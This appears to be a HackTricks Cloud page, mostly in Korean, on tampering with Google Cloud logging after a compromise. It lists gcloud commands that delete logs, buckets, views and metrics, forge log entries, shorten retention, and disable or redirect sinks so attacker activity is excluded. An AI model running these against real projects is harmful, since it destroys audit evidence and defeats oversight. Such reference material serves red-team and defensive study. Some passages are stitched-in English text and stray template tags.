# GCP - 로깅 후 공격

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 AWS 해킹을 처음부터 전문가까지 배워보세요<strong>!</strong></summary>

HackTricks를 지원하는 다른 방법:

* **회사를 HackTricks에서 광고하거나 HackTricks를 PDF로 다운로드**하려면 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요. 독점적인 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**를** **팔로우**하세요.
* **HackTricks**와 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 저장소에 PR을 제출하여 해킹 기법을 공유하세요.

</details>

## 기본 정보

자세한 정보는 다음을 참조하세요:

{% content-ref url="../gcp-services/gcp-logging-enum.md" %}
[gcp-logging-enum.md](../gcp-services/gcp-logging-enum.md)
{% endcontent-ref %}

모니터링 방해를 위한 다른 방법은 다음을 확인하세요:

{% content-ref url="gcp-monitoring-post-exploitation.md" %}
[gcp-monitoring-post-exploitation.md](gcp-monitoring-post-exploitation.md)
{% endcontent-ref %}

### 기본 로깅

기본적으로 **`GetIamPolicy`** 로그는 생성되지 않으므로 권한 열거는 감지되지 않습니다.\
또한, 이러한 로그를 활성화하려면 모니터링하려는 각 서비스의 **관리자 읽기 로그를 활성화**해야 합니다. 예를 들어 `Projects`에서 `GetIamPolicy` 작업을 얻으려면 `Cloud Resources`에서 `관리자 읽기`를 활성화하고, `Pub/Sub` (예를 들어) 개체에서 `GetIamPolicy` 작업을 얻으려면 해당 개체에서 `관리자 읽기`를 활성화해야 합니다.\
더 많은 서비스 로깅을 활성화하기 위한 URL: [https://console.cloud.google.com/iam-admin/audit](https://console.cloud.google.com/iam-admin/audit)

기본적으로 이러한 로그는 활성화되지 않습니다. 로그와 비용의 노이즈를 증가시킬 수 있으므로 여러 GCP 조직에서는 이를 활성화하지 않을 수도 있습니다.

### 로그 읽기 - `logging.logEntries.list`

{% code overflow="wrap" %}
```bash
# Read logs
gcloud logging read "logName=projects/your-project-id/logs/log-id" --limit=10 --format=json

# Everything from a timestamp
gcloud logging read "timestamp >= \"2023-01-01T00:00:00Z\"" --limit=10 --format=json

# Use these options to indicate a different bucket or view to use: --bucket=_Required  --view=_Default
```
### `logging.logs.delete`

{% code overflow="wrap" %}
```bash
# Delete all entries from a log in the _Default log bucket - logging.logs.delete
gcloud logging logs delete <log-name>
```
### 로그 작성 - `logging.logEntries.create`

{% code overflow="wrap" %}
```bash
# Write a log entry to try to disrupt some system
gcloud logging write LOG_NAME "A deceptive log entry" --severity=ERROR
```
### `logging.buckets.update`

{% code overflow="wrap" %}
```bash
# Set retention period to 1 day (_Required has a fixed one of 400days)

gcloud logging buckets update bucketlog --location=<location> --description="New description" --retention-days=1
```
{% code %}

### `logging.buckets.delete`

### `logging.buckets.delete`를 사용하여 로깅 버킷 삭제

{% endcode %}
```bash
# Delete log bucket
gcloud logging buckets delete BUCKET_NAME --location=<location>
```
### `logging.links.delete`

{% code overflow="wrap" %}로그 링크 삭제{% endcode %}
```bash
# Delete link
gcloud logging links delete <link-id> --bucket <bucket> --location <location>
```
{% code %}

### `logging.views.delete`
```bash
# Delete a logging view to remove access to anyone using it
gcloud logging views delete <view-id> --bucket=<bucket> --location=global
```
### `logging.views.update`

{% code overflow="wrap" %}
```bash
# Update a logging view to hide data
gcloud logging views update <view-id> --log-filter="resource.type=gce_instance" --bucket=<bucket> --location=global --description="New description for the log view"
```
### `logging.logMetrics.update`

{% code overflow="wrap" %}
```bash
# Update log based metrics - logging.logMetrics.update
gcloud logging metrics update <metric-name> --description="Changed metric description" --log-filter="severity>CRITICAL" --project=PROJECT_ID
```
{% endcode %}

### `logging.logMetrics.delete`
```bash
# Delete log based metrics - logging.logMetrics.delete
gcloud logging metrics delete <metric-name>
```
### `logging.sinks.delete`

`logging.sinks.delete` is a command used to delete a sink in Google Cloud Platform (GCP) Logging. Sinks are used to export log entries from GCP Logging to other destinations, such as Google Cloud Storage or BigQuery.

To use `logging.sinks.delete`, you need to have the necessary permissions to manage sinks in GCP Logging. Once you have the required permissions, you can run the command with the following syntax:

```plaintext
gcloud logging sinks delete <SINK_NAME> [--project=<PROJECT_ID>]
```

Replace `<SINK_NAME>` with the name of the sink you want to delete. Optionally, you can specify the `--project` flag followed by the ID of the GCP project if you want to delete a sink from a specific project.

After executing the command, the specified sink will be permanently deleted from GCP Logging. Make sure to double-check the sink name before running the command, as the deletion cannot be undone.

Note: Deleting a sink does not delete the log entries that were exported to the sink's destination. If you want to delete the exported log entries as well, you need to delete them separately from the destination service.
```bash
# Delete sink - logging.sinks.delete
gcloud logging sinks delete <sink-name>
```
### `logging.sinks.update`

{% code overflow="wrap" %}

### `logging.sinks.update`

`logging.sinks.update` is a method in GCP that allows you to update the configuration of a logging sink. A logging sink is a destination for log entries in GCP, such as Cloud Storage, BigQuery, or Pub/Sub.

To use `logging.sinks.update`, you need to provide the project ID, the sink name, and the updated configuration. The configuration can include properties like the destination, filter, and output format.

Here is an example of how to use `logging.sinks.update`:

```bash
gcloud logging sinks update [SINK_NAME] --project=[PROJECT_ID] --destination=[DESTINATION] --filter=[FILTER] --output-version=[OUTPUT_VERSION]
```

Replace `[SINK_NAME]` with the name of the logging sink you want to update, `[PROJECT_ID]` with your GCP project ID, `[DESTINATION]` with the new destination for the log entries, `[FILTER]` with the updated filter, and `[OUTPUT_VERSION]` with the desired output format version.

Keep in mind that you need the necessary permissions to update logging sinks in GCP.
```bash
# Disable sink - logging.sinks.update
gcloud logging sinks update <sink-name> --disabled

# Createa filter to exclude attackers logs - logging.sinks.update
gcloud logging sinks update SINK_NAME --add-exclusion="name=exclude-info-logs,filter=severity<INFO"

# Change where the sink is storing the data - logging.sinks.update
gcloud logging sinks update <sink-name> new-destination

# Change the service account to one withuot permissions to write in the destination - logging.sinks.update
gcloud logging sinks update SINK_NAME --custom-writer-identity=attacker-service-account-email --project=PROJECT_ID

# Remove explusions to try to overload with logs - logging.sinks.update
gcloud logging sinks update SINK_NAME --clear-exclusions

# If the sink exports to BigQuery, an attacker might enable or disable the use of partitioned tables, potentially leading to inefficient querying and higher costs. - logging.sinks.update
gcloud logging sinks update SINK_NAME --use-partitioned-tables
gcloud logging sinks update SINK_NAME --no-use-partitioned-tables
```
{% endcode %}

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 AWS 해킹을 처음부터 전문가까지 배워보세요<strong>!</strong></summary>

HackTricks를 지원하는 다른 방법:

* **회사를 HackTricks에서 광고하거나 HackTricks를 PDF로 다운로드**하려면 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요. 독점적인 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**를** **팔로우**하세요.
* **Hacking 트릭을 공유하려면** [**HackTricks**](https://github.com/carlospolop/hacktricks) **및** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **github 저장소에 PR을 제출하세요.**

</details>
